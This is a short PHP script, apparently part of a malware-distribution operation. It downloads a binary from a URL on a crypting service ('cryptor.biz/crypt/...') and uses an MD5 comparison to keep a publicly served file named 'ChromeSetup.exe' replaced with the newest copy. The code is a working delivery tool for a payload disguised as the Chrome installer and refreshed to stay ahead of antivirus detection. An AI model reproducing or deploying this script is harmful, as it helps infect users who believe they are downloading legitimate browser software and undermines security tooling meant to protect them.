<?php
#Download file scrypt by pub3 
//Setupjoe
$namefile='ChromeSetup.exe'; //full name your file.
$dirft='/home/connectiflyroot/public_html/upload/ChromeSetup.exe'; //set full path to file to on your ftp. example: /home/user/file.exe
$dirtmp='/home/connectiflyroot/public_html/upload/tmp/ChromeSetup.exe'; //set full path for tmp directory for file download
$durl='http://cryptor.biz/crypt/bo162/api/xLTV925hMolskKNNhOPVn3sdRXsqOpT3'; //set url for download file
//end setup

//Not change this
file_put_contents($dirtmp, fopen($durl, 'r'));

if (md5_file($dirft) == md5_file($dirtmp)){
	echo 'wait, file was not update';
}
	else { 
	echo 'download';
file_put_contents($dirft, fopen($durl, 'r'));
	}


?>